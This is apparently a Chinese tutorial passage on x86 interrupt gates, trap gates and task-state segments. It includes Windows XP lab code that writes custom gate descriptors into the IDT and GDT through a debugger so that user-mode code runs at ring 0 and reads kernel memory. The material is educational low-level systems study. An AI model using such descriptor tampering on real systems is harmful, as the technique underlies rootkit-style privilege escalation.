<p><img data-src="https://s2.loli.net/2021/12/18/jUuGQ5veICknKBi.png" alt="52.png"></p>
<p>关于GDTR、IDTR、LDTR、TR寄存器可查看Intel开发手册卷3的2.4内存管理寄存器。</p>
<p><img data-src="https://s2.loli.net/2021/12/18/i18sCte3UGb6vyf.png" alt="53.png"></p>
<ol>
<li><p><strong>中断门描述符：</strong>可以看到，中断门是没有参数的。</p>
<p>D&#x3D;1，32位的中断门描述符，Type&#x3D;0x1110&#x3D;0xE。</p>
<p>D&#x3D;0，16位的中断门描述符，Type&#x3D;0x0110&#x3D;0x6。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/ZgXQUSETRpABVhM.png" alt="54.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/19/RNkserCWtXMZF5D.png" alt="55.png"></p>
</li>
<li><p><strong>本文描述的是软件中断（软中断）</strong>。</p>
</li>
</ol>
<ul>
<li><p>使用INT N来实现的中断是软中断，N&#x3D;0～255，N称为中断向量，也是IDT表的索引。</p>
</li>
<li><p>N&#x3D;32～255为用户自定义的中断，当前P&#x3D;0。</p>
</li>
</ul>
<p>各类中断号对应的含义如下图：</p>
<p><img data-src="https://s2.loli.net/2021/12/19/BcpDH8f6i1whAxo.png" alt="59.png"></p>
<ol start="2">
<li><p><strong>中断门的执行流程：</strong></p>
<p><img data-src="https://s2.loli.net/2021/12/19/rokeOft5ChbxJMz.png" alt="56.png"></p>
<p><img data-src="https://s2.loli.net/2022/01/25/etX6hsudkyCVbRn.png" alt="35.png"></p>
<p><strong>指明中断门的段选择子指向的GDT段描述符需要是一个代码段描述符（和调用门中的段选择子一样都是指向代码段描述符）。</strong></p>
</li>
</ol>
<div class="note danger"><p>中断门执行流程：</p>
<ol>
<li><p>当执行<code>int n</code>时，以n为索引（下标）去IDT表找对应的描述符，这个n是几就找到IDT表对应的第n+1个(从0开始)。</p>
</li>
<li><p>获取到中断门段描述符后检查权限，进行段权限检查(没有RPL，只检查CPL，CPL&gt;&#x3D;DPL)。</p>
</li>
<li><p>权限检查通过后，获取新的段选择子（中断门描述符16-31位）与之对应的GDT表中的段描述符的Base，再加上IDT表中的Offset作为EIP去跳转，即$EIP &#x3D; IDT-Interrupt-Segment-Description.Offset ⊕ GDT-Descriptor.Base$</p>
</li>
</ol>
</div>

<ol start="4">
<li><strong>中断门的堆栈切换</strong>（中断门没有参数）：</li>
</ol>
<p><img data-src="https://s2.loli.net/2021/12/19/Tf5bvzJd78KRPLV.png" alt="57.png"></p>
<ol start="5">
<li><p><strong>中断门的返回：</strong></p>
<p><code>INT N</code>指令：<br>1、在没有权限切换时，会向堆栈PUSH3个值，分别是：<br>CS EFLAG EIP（返回地址）<br>2、在有权限切换时，会向堆栈PUSH5个值，分别是<br>SS ESP EFLAG CS EIP<br><strong>在中断门中，不能通过RETF返回，而应该通过IRET&#x2F;IRETD指令返回。</strong></p>
</li>
</ol>
<p>中断门的返回：</p>
<ul>
<li>16位：<code>iret</code></li>
<li>32位：<code>iretd</code></li>
<li>64位：<code>iretq</code></li>
</ul>
<p>调用门的返回：<code>retf</code>。</p>
<div class="note warning"><p>iretd比retf多返回一个EFLAG寄存器，该寄存器在中断门执行时，将IF位清零（EFLAG寄存器下标位9的位），如果IF位为0，那CPU将不再接收可屏蔽中断。（具体可见Intel手册卷3第六章中断和异常）</p>
</div>

<p>从硬件层面来看，中断分为可屏蔽（受IF位影响，IF&#x3D;0，可屏蔽中断，中断产生时CPU不管）和不可屏蔽。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/ySQIR7D1LpUgh3v.png" alt="58.png"></p>
<h3 id="1-1-中断门段权限检查"><a href="#1-1-中断门段权限检查" class="headerlink" title="1.1 中断门段权限检查"></a>1.1 中断门段权限检查</h3><ol>
<li>中断门描述符DPL &gt; CS段描述符的DPL，即中断门描述符<strong>DPL&#x3D;CPL&#x3D;3&gt;CS.DPL&#x3D;0</strong>。</li>
<li>中断门描述符<strong>RPL&#x3D;0&#x2F;3</strong>。</li>
</ol>
<h3 id="1-2-调用门和中断门的区别"><a href="#1-2-调用门和中断门的区别" class="headerlink" title="1.2 调用门和中断门的区别"></a>1.2 调用门和中断门的区别</h3><ol>
<li>调用门通过call far指令执行，但中断门通过int指令执行。</li>
<li>调用门查GDT表，中断门查IDT表后再查GDT表。</li>
<li>call cs:eip中的CS是段选择子，由三部分组成。但int [index]指令中的index只是索引，中断门不检查RPL，只检查CPL。</li>
<li>调用门可以有参数，但中断门没有。</li>
<li>调用门提权时push了四个寄存器：EIP(返回地址) CS ESP SS，返回时用RETF指令返回。中断门提权时push了五个寄存器：EIP(返回地址) CS EFLAGS ESP SS，返回时用IRETD指令返回。</li>
</ol>
<h3 id="1-3-练习：使用中断门"><a href="#1-3-练习：使用中断门" class="headerlink" title="1.3 练习：使用中断门"></a>1.3 练习：使用中断门</h3><p>题目：构造中断门读高2G的内存，并观察在3环、0环的EFALG寄存器的变化。           </p>
<p>定义一个裸函数，在里面读取一下IDT表的一个值，以证明自己的CPL是0。</p>
<ol>
<li><p>观察IDT表，找一个P&#x3D;0的来构造中断门描述符。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/coIKEfAemaHibOx.png" alt="60.png"></p>
<p>该项在IDT表的下标为32，则中断可构造：int 32</p>
</li>
<li><p>根据中断门描述符结构，构造一个中断门描述符去查找GDT表。$EIP &#x3D; Interrupt-Segment-Selector.Offset ⊕ GDT-Descriptor.Base$</p>
<p>初步构造：</p>
<ul>
<li>偏移：0000 0000</li>
<li>P&#x3D;1</li>
<li>DPL&#x3D;11（<strong>DPL&#x3D;CPL&#x3D;3&gt;CS.DPL&#x3D;0</strong>）</li>
<li>S&#x3D;0</li>
<li>Type&#x3D;1110&#x3D;0xE</li>
<li>中断门无参数</li>
<li>段选择子：<ul>
<li>RPL&#x3D;00&#x2F;11，随意（比较CPL、DPL）</li>
<li>TI&#x3D;0</li>
<li>Index&#x3D;1</li>
<li>00001 0 00&#x3D;0x08，00001 0 11&#x3D;0x0B</li>
</ul>
</li>
<li>0000<strong>EE</strong>00&#96;<strong>0008</strong>0000或者0000<strong>EE</strong>00·<strong>000B</strong>0000</li>
</ul>
</li>
<li><p>根据代码构造中断门描述符。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE IDTItem0[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// R0函数，读取了IDT表第一项</span></span><br><span class="line"><span class="comment">// 00401020</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Function()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//int 3  调试用的</span></span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">      </span><br><span class="line">		mov eax,<span class="number">0x8003f400</span></span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov ecx,[eax+<span class="number">0x4</span>]</span><br><span class="line">		mov dword ptr ds:[IDTItem0],ebx</span><br><span class="line">		mov dword ptr ds:[IDTItem0+<span class="number">0x4</span>],ecx</span><br><span class="line">      </span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">		iretd <span class="comment">// iret 会蓝屏，因为 iret的硬编码是66CF，32位下应该使用iretd，硬编码是CF</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> <span class="number">32</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%08x %08x\n&quot;</span>, *(PDWORD)IDTItem0, *(PDWORD)((PBYTE)IDTItem0+<span class="number">0x4</span>));</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://s2.loli.net/2021/12/19/EMwfZOh2Irg4Nic.png" alt="62.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/19/e6sihXKDp3QGNTv.png" alt="63.png"></p>
<p>则中断门描述符为：0040<strong>EE</strong>00&#96;00081020或者0040<strong>EE</strong>00·000B1020。</p>
<p>观察到此时：EFLAG寄存器<mark class="label success">ELF=0x216</mark>。</p>
</li>
<li><p>将中断门描述符写入到IDT表。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/5KDQ8BUb9V6IuL7.png" alt="64.png"></p>
</li>
<li><p>回到XP的VC6中在裸函数代码第一行加个<code>int 3</code>方便查看此时0环的堆栈情况。（需要重新编译查看裸函数的入口地址，如果改变需要修改IDT表的第32项），F5执行如下图。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/AvOWkP6g5otylMn.png" alt="65.png"></p>
<p>此时，堆栈中比提权调用门多一个3环的EFLAG寄存器。且EFLAG0&#x3D;0x16，EFLAG3&#x3D;0x216，对比看得出结论：<strong>中断门在0环将IF位置0了</strong>。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/W2NGfvQeyqrXz6a.png" alt="66.png"></p>
</li>
</ol>
<h3 id="1-4-练习：RETF返回中断门"><a href="#1-4-练习：RETF返回中断门" class="headerlink" title="1.4 练习：RETF返回中断门"></a>1.4 练习：RETF返回中断门</h3><p>中断门提权进0环的堆栈如下右图：</p>
<p><img data-src="https://s2.loli.net/2022/01/28/a4ObrEtMexYh9jB.png" alt="96.png"></p>
<p>相比于调用门多压入一个EFLAG3寄存器，在中断门中用RETF返回，只需将[ESP0+0x8]写到EFLAG3，然后让ESP3和SS3向低地址移动4字节即可。</p>
<ol>
<li><p>构造代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE IDTItem0[<span class="number">8</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// R0 函数，读取了IDT表第一项</span></span><br><span class="line"><span class="comment">// 004113A0</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) R0Function()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//int 3 // 调试用的</span></span><br><span class="line">		pushad	<span class="comment">//esp - 0x20</span></span><br><span class="line">		mov eax,<span class="number">0x8003f400</span></span><br><span class="line">		mov ebx,[eax]</span><br><span class="line">		mov ecx,[eax+<span class="number">0x4</span>]</span><br><span class="line">		mov dword ptr ds:[IDTItem0],ebx</span><br><span class="line">		mov dword ptr ds:[IDTItem0+<span class="number">0x4</span>],ecx</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 要求用 retf 返回</span></span><br><span class="line">		add esp,<span class="number">0x28</span>		<span class="comment">// esp0指向eflags3</span></span><br><span class="line">		popfd        		<span class="comment">// esp0+4,esp0指向3环esp3</span></span><br><span class="line">		mov eax,[esp]		<span class="comment">// 将原ESP3和SS3向低地址移动4字节</span></span><br><span class="line">		mov [esp<span class="number">-0x4</span>],eax</span><br><span class="line">		mov eax,[esp+<span class="number">0x4</span>]</span><br><span class="line">		mov [esp],eax</span><br><span class="line"></span><br><span class="line">		sub esp,<span class="number">0x2C</span></span><br><span class="line">		popad</span><br><span class="line"></span><br><span class="line">		retf</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm </span><br><span class="line">	&#123;</span><br><span class="line">		INT <span class="number">32</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%08x %08x\n&quot;</span>, *(PDWORD)IDTItem0, *(PDWORD)((PBYTE)IDTItem0+<span class="number">0x4</span>));</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造中断门描述符，0040<strong>EE</strong>00&#96;<strong>0008</strong>1020。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/sHeCgjGdhwzL7AT.png" alt="68.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/19/49TgfJz12dV5nBs.png" alt="69.png"></p>
</li>
<li><p>修改IDT表的中断向量为32的那项。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/zwhEdBC4TrA58mc.png" alt="70.png"></p>
</li>
<li><p>回到XP中取消断点后F5执行结果如下。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/B1OgRvws6YV5UxZ.png" alt="67.png"></p>
</li>
</ol>
<h3 id="1-5-练习：IRETD返回调用门"><a href="#1-5-练习：IRETD返回调用门" class="headerlink" title="1.5 练习：IRETD返回调用门"></a>1.5 练习：IRETD返回调用门</h3><p>iretd返回会弹出5个值（EIP、CS3、EFLAG3、ESP3、SS3），但是retf返回仅4个值（EIP、CS3、ESP3、SS3）</p>
<p>故使用IRETD返回调用门时只需要：<strong>将ESP和SS向高地址移动4字节，将EFLAG写到[ESP+0x8]即可</strong>。</p>
<div class="note primary"><p>这样能成功的原因：调用门提权时并不会将EFLAG的IF清零，所以在0环执行代码的时候将EFLAG压栈不会产生错误。</p>
</div>

<p>调用门（无参数）：</p>
<p><img data-src="https://s2.loli.net/2022/01/28/vrpX1AEgCufyYmZ.png" alt="95.png"></p>
<ol>
<li><p>构造代码。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dwHigh2GValue;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 该函数通过 CALL FAR 调用，使用调用门提权，拥有0环权限</span></span><br><span class="line"><span class="keyword">void</span> __declspec(naked) FunctionHas0CPL()</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		pushad	<span class="comment">//esp - 0x20</span></span><br><span class="line">		pushfd	<span class="comment">//esp - 0x24</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">// 读取了GDT表第二项的低4字节</span></span><br><span class="line">		mov eax,<span class="number">0x8003f008</span></span><br><span class="line">		mov eax,[eax]</span><br><span class="line">		mov dwHigh2GValue,eax</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 要求用 iretd 返回		</span></span><br><span class="line">		add esp,<span class="number">0x30</span>		<span class="comment">// esp指向ss</span></span><br><span class="line">		</span><br><span class="line">		mov eax,[esp]		<span class="comment">// 将原ESP和SS向高地址移动4字节</span></span><br><span class="line">		mov [esp+<span class="number">0x4</span>],eax</span><br><span class="line">		mov eax,[esp<span class="number">-0x4</span>]</span><br><span class="line">		mov [esp],eax</span><br><span class="line">		pushfd</span><br><span class="line">		sub esp,<span class="number">0x2c</span>		<span class="comment">// 还原esp</span></span><br><span class="line"></span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line"></span><br><span class="line">		iretd</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buff[<span class="number">6</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x48</span>,<span class="number">0</span>&#125;;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		call fword ptr [buff] <span class="comment">// 长调用，使用调用门提权</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>,dwHigh2GValue);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>构造调用门描述符，0040<strong>EC</strong>00&#96;00081020。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/TcpPXawbqGzRsnL.png" alt="71.png"></p>
<p><img data-src="https://s2.loli.net/2021/12/19/8PmKfdbjVOSloGy.png" alt="72.png"></p>
</li>
<li><p>修改GDT表对应的项，eq 8003f048 0040EC00&#96;00081020。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/VOaDjYPcKv4HGIs.png" alt="73.png"></p>
</li>
<li><p>回到XP中取消断点后F5执行，如下。</p>
<p><img data-src="https://s2.loli.net/2021/12/19/JuxN7iwqeFSXKI8.png" alt="74.png"></p>
</li>
</ol>
<h2 id="2-陷阱门"><a href="#2-陷阱门" class="headerlink" title="2 陷阱门"></a>2 陷阱门</h2><p>陷阱门和中断门除了以下区别，在使用上没什么区别。</p>
<ul>
<li><strong>TYPE</strong>域（32位）<ul>
<li>中断门：Type&#x3D;0x111<strong>0</strong>&#x3D;0xE。</li>
<li>陷阱门：Type&#x3D;0x111<strong>1</strong>&#x3D;0xF。</li>
</ul>
</li>
<li><strong>IF</strong>位是否清零（进入0环后）<ul>
<li>中断门：IF清零</li>
<li>陷阱门：IF不清零</li>
</ul>
</li>
</ul>
<p>使用陷阱门同样会压栈5个参数，应该说<mark class="label danger">通过INT N进入0环都会压栈5个参数</mark>。Windows不使用陷阱门（但是我们可以构造，因为CPU支持）。</p>
<p>陷阱门结构如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/20/5ZEvXOJG67YAIzC.png" alt="75.png"></p>
<ul>
<li>D&#x3D;0，16位陷阱门</li>
<li>D&#x3D;1，32位陷阱门</li>
</ul>
<p>中断门：<strong>高四字节的的第8位 &#x3D; 0</strong>；</p>
<p>陷阱门：<strong>高四字节的的第8位 &#x3D; 1</strong>。</p>
<p>CPU 必须支持中断，中断分为可屏蔽中断和不可屏蔽中断。</p>
<p>中断是基于硬件的，鼠标，键盘是可屏蔽中断，电源属于不可屏蔽中断。当我们拔掉电源之后,CPU并不是直接熄灭的，而是有电容的，此时不管你eflags的IF位是什么，都会执行<code>int 2</code>中断，来进行一些收尾的动作。</p>
<p>中断是可以进行软件模拟的，称为软中断。 也就是通过 <strong>int n</strong> 来进行模拟。 我们构造的中断门，并且进行<code>int n</code>模拟就是模拟了一次软中断。</p>
<div class="note info"><ol>
<li>GDT表中没有调用门描述符，IDT表中没有陷阱门描述符。</li>
<li>Windows不使用<strong>调用门</strong>和<strong>陷阱门</strong>。</li>
</ol>
</div>

<h2 id="3-任务段"><a href="#3-任务段" class="headerlink" title="3 任务段"></a>3 任务段</h2><div class="note primary"><p>在调用门、中断门与陷阱门中，一旦出现权限切换，那么就会有堆栈的切换。而且，由于CS的CPL发生改变，也导致了SS也必须要切换。切换时，会有新的ESP0和SS0（CS是由中断门或者调用门指定）这2个值是从TSS来的。</p>
</div>

<p>执行流程：3环CALL<strong>任务段选择子</strong> --&gt; 根据段选择子到GDT找到对应任务段描述符 --&gt; 将任务段描述符加载到TR寄存器，同时根据任务段中的Base找到TSS内存块的起始地址 --&gt; 根据TSS中的EIP去执行代码 --&gt; IRETD返回。</p>
<h3 id="3-1-TSS结构及作用"><a href="#3-1-TSS结构及作用" class="headerlink" title="3.1 TSS结构及作用"></a>3.1 TSS结构及作用</h3><p>TSS(Task-state segment )，任务状态段。是一块内存，大小为104字节，其中存的是一堆寄存器的值。一个任务对应一块TSS。</p>
<p>32位的TSS结构图如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/20/y3UogsCh7piWzId.png" alt="76.png"></p>
<p>用结构体可以表示为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TSS</span> &#123;</span></span><br><span class="line">    DWORD link; <span class="comment">// 保存前一个 TSS 段选择子，使用 call 指令切换寄存器的时候由CPU填写。</span></span><br><span class="line">    <span class="comment">// 这 6 个值是固定不变的，用于提权，CPU 切换栈的时候用</span></span><br><span class="line">    DWORD esp0; <span class="comment">// 保存 0 环栈指针</span></span><br><span class="line">    DWORD ss0;  <span class="comment">// 保存 0 环栈段选择子</span></span><br><span class="line">    DWORD esp1; <span class="comment">// 保存 1 环栈指针</span></span><br><span class="line">    DWORD ss1;  <span class="comment">// 保存 1 环栈段选择子</span></span><br><span class="line">    DWORD esp2; <span class="comment">// 保存 2 环栈指针</span></span><br><span class="line">    DWORD ss2;  <span class="comment">// 保存 2 环栈段选择子</span></span><br><span class="line">    <span class="comment">// 下面这些都是用来做切换寄存器值用的，切换寄存器的时候由CPU自动填写。</span></span><br><span class="line">    DWORD cr3; </span><br><span class="line">    DWORD eip;  </span><br><span class="line">    DWORD eflags;</span><br><span class="line">    DWORD eax;</span><br><span class="line">    DWORD ecx;</span><br><span class="line">    DWORD edx;</span><br><span class="line">    DWORD ebx;</span><br><span class="line">    DWORD esp;</span><br><span class="line">    DWORD ebp;</span><br><span class="line">    DWORD esi;</span><br><span class="line">    DWORD edi;</span><br><span class="line">    DWORD es;</span><br><span class="line">    DWORD cs;</span><br><span class="line">    DWORD ss;</span><br><span class="line">    DWORD ds;</span><br><span class="line">    DWORD fs;</span><br><span class="line">    DWORD gs;</span><br><span class="line">    DWORD ldt_selector;<span class="comment">//ldt段选择子,用于换ldtr寄存器，一个TSS对应一个LDT表，就算你有100个任务，那么ldtr寄存器里</span></span><br><span class="line">  			<span class="comment">//面存储的也是当前ldt表，也就是任务切换时，LDT表会切换，但GDT表不会切换</span></span><br><span class="line">    <span class="comment">// 这个暂时忽略</span></span><br><span class="line">    DWORD io_map;</span><br><span class="line">&#125; TSS;</span><br></pre></td></tr></table></figure>

<p>低地址中的ESP0，SS0用于从3环堆栈到0环堆栈。切换CR3等于切换进程。</p>
<p>Intel的设计TSS初衷是：切换任务（站在CPU的角度来说，<strong>操作系统中的线程可以称为任务</strong>）。CPU考虑到操作系统的线程在执行的时候会不停的切换，所以设计了TSS，让任务可以来回的切换。</p>
<p><strong>但是操作系统并没有采用该方法切换线程(Windows、Linux都没有这样做)。</strong>Windows仅使用了TSS中的ESP0、SS0。</p>
<blockquote>
<p>对TSS作用的理解应该仅限于存储寄存器即可，跟任务(线程)切换没有关系。TSS的意义就在于可以<strong>同时换掉”一堆”寄存器</strong>。</p>
</blockquote>
<div class="note warning"><ol>
<li>TSS是一块104字节内存，通过TR寄存器找到这块内存，TR寄存器的Base指向这块内存，Limit为这块内存的大小，TR的值来自GDT表的TSS段描述符。</li>
<li>CPU中的一个任务对应一块TSS内存，任务切换时TSS也会跟着切换，TSS是跟随任务的一个链表，如32位TSS的低4字节就指向<strong>前一个TSS段描述符的段选择子</strong>。</li>
<li>TSS替换寄存器的过程：<strong>3环代码CALL&#x2F;JMPTR使用段选择子触发TSS段描述符，然后将段描述符加载到TR寄存器，根据TR的Base找到TSS内存块，将内存块的值加载到其结构包涵的所有寄存器中，然后执行TSS中的EIP，该EIP是从TSS段内存块中来的</strong>。</li>
</ol>
</div>

<p><strong>关于TSS结构中的LDT Segment Selector成员：</strong></p>
<ol>
<li>该成员是LDTR段寄存器的可见16位部分（段选择子）。</li>
<li>LDT段选择子去查LDT表，根据LDT表中对应的段描述符装载此时的LDTR寄存器。</li>
<li>LDTR段寄存器的Base指向LDT表，Limit为LDT表大小。 </li>
<li>一个LDTR寄存器的值对应于当前任务，一个任务一张LDT表。</li>
<li>Windows没有使用LDT表和LDTR寄存器。</li>
</ol>
<h3 id="3-2-TSS、TR读写"><a href="#3-2-TSS、TR读写" class="headerlink" title="3.2 TSS、TR读写"></a>3.2 TSS、TR读写</h3><p><strong>TSS替换寄存器的过程</strong>：3环代码CALL&#x2F;JMP使用TR段选择子触发TSS段描述符，然后将段描述符加载到TR寄存器，根据TR的Base找到TSS内存块，将内存块的值加载到其结构包涵的所有寄存器中。过程如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/22/9k8cHTDjOZtn46q.png" alt="78.png"></p>
<p>TSS段描述符结构如下：</p>
<p><img data-src="https://s2.loli.net/2021/12/22/ECYDcgjBQMkbJmK.png" alt="79.png"></p>
<div class="note default"><p>TSS段描述符中：</p>
<ul>
<li>Type域<ul>
<li>高四字节的第9位是一个判断位，如果此时该TSS段描述符<strong>已经被加载到TR寄存器中</strong>，那么该位为<mark class="label danger">1</mark>，16进制下为B。</li>
<li>如果该TSS段描述符<strong>没有被加载到TR寄存器中</strong>，那么该位为<mark class="label danger">0</mark>，16进制下为9。</li>
</ul>
</li>
<li>G位<ul>
<li>G&#x3D;0，说明<strong>寻址按字节来</strong>（TSS用）</li>
<li>G&#x3D;1，说明寻址按4kb来（页）</li>
</ul>
</li>
</ul>
</div>

<p><strong>TR寄存器读写</strong></p>
<p>（1）写TR寄存器：将TSS段描述符加载到TR寄存器，使用指令：<strong>LTR</strong></p>
<p>有几点需要注意：</p>
<ul>
<li><p>用LTR指令去装载的话 仅仅是改变TR寄存器的值(96位) ，并没有真正改变TSS。</p>
</li>
<li><p>LTR指令只能在系统层使用。(当前CPU权限必须是0环的)</p>
</li>
<li><p>加载后TSS段描述符会状态位会发生改变。(高四字节的第9位发生变化)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov ax,SelectorTSS</span><br><span class="line">ltr ax</span><br></pre></td></tr></table></figure>

<p>执行该指令，从GDT表取TSS描述符填充TR寄存器，但并不会修改其他寄存器。<br>执行指令后，T<strong>SS描述符TYPE域低2位会置1</strong>。</p>
</li>
</ul>
<p>（2）读TR寄存器：使用指令：<strong>STR</strong></p>
<ul>
<li><p>如果用STR去读的话，只读了TR的16位也就是段选择子。这跟读取CS段寄存器一样，读取16位。（读16位写96位）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">str ax</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>注意：</strong></p>
<p>使用<code>LTR</code>仅能在0环权限下修改TR段寄存器，但是并不会改变TSS的值，<mark class="label danger">要想同时改变TR寄存器和TSS的值</mark>，可以在Ring3下使用CALL FAR、JMP FAR指令来修改。（在Intel手册第二卷有关于Call的三种用法介绍：段内调用、远调用、任务段调用）</p>
<h3 id="3-3-CALL、JMP访问任务段的区别"><a href="#3-3-CALL、JMP访问任务段的区别" class="headerlink" title="3.3 CALL、JMP访问任务段的区别"></a>3.3 CALL、JMP访问任务段的区别</h3><div class="note success"><ol>
<li>调用时的区别</li>
</ol>
<ul>
<li><p><strong>CALL FAR</strong>：EFLAGS 的 NT位置1，会修改TSS previous task link，属于任务嵌套。</p>
</li>
<li><p><strong>JMP FAR</strong>：  NT位&#x3D;0，不会修改TSS previous task link，不属于任务嵌套。</p>
</li>
</ul>
<ol start="2">
<li>使用<code>iretd</code>返回时的区别：<strong>CPU根据NT位决定返回方式，NT位影响iretd</strong></li>
</ol>
<ul>
<li>如果NT&#x3D;1，CPU使用TSS的 Previous task link 里存储的上一个任务的TSS选择子进行返回（<strong>是上一个TSS段选择子，里面保存的EIP即为返回地址</strong>）<mark class="label warning">任务返回</mark></li>
<li>如果NT&#x3D;0，则使用堆栈中的值返回（<mark class="label warning">中断返回</mark>）</li>
</ul>
</div>

<p><img data-src="https://s2.loli.net/2021/12/19/ySQIR7D1LpUgh3v.png" alt="58.png"></p>
<p>关于在我们自己的代码中使用<code>int 3</code>，函数在执行到该指令无法正常返回时蓝屏的解释（int 3在0环做的两件事）？（<strong>目前还不清楚具体原因</strong>）</p>
<ol>
<li>修改FS段寄存器</li>
<li>将NT位置0</li>
</ol>
<p><strong>但是在使用int 3后，恢复上述两种任何一个值都可以正常返回</strong>。</p>
<h3 id="3-4-练习：使用CALL调用任务段修改所有寄存器"><a href="#3-4-练习：使用CALL调用任务段修改所有寄存器" class="headerlink" title="3.4 练习：使用CALL调用任务段修改所有寄存器"></a>3.4 练习：使用CALL调用任务段修改所有寄存器</h3><p>使用CALL FAR实现用TSS替换寄存器。</p>
<p><strong>CALL FAR</strong>：EFLAGS 的 NT位置1，会修改TSS previous task link</p>
<p>大体流程为：</p>
<ol>
<li>准备一个104字节的TSS，并附上正确的值。</li>
<li>准备一个自己写的TSS段描述符，写入到GDT表的一个空白的位置。</li>
<li>修改TR寄存器（CALL FAR，JMP FAR）。</li>
<li>注意TSS中的EIP，该EIP是从TSS内存块中来的。</li>
</ol>
<p>TSS可以使用数组，也可以<code>VirtualAlloc</code>，建议后者，因为<strong>TSS最好是页对齐的</strong>。</p>
<ol>
<li><p>准备TSS。</p>
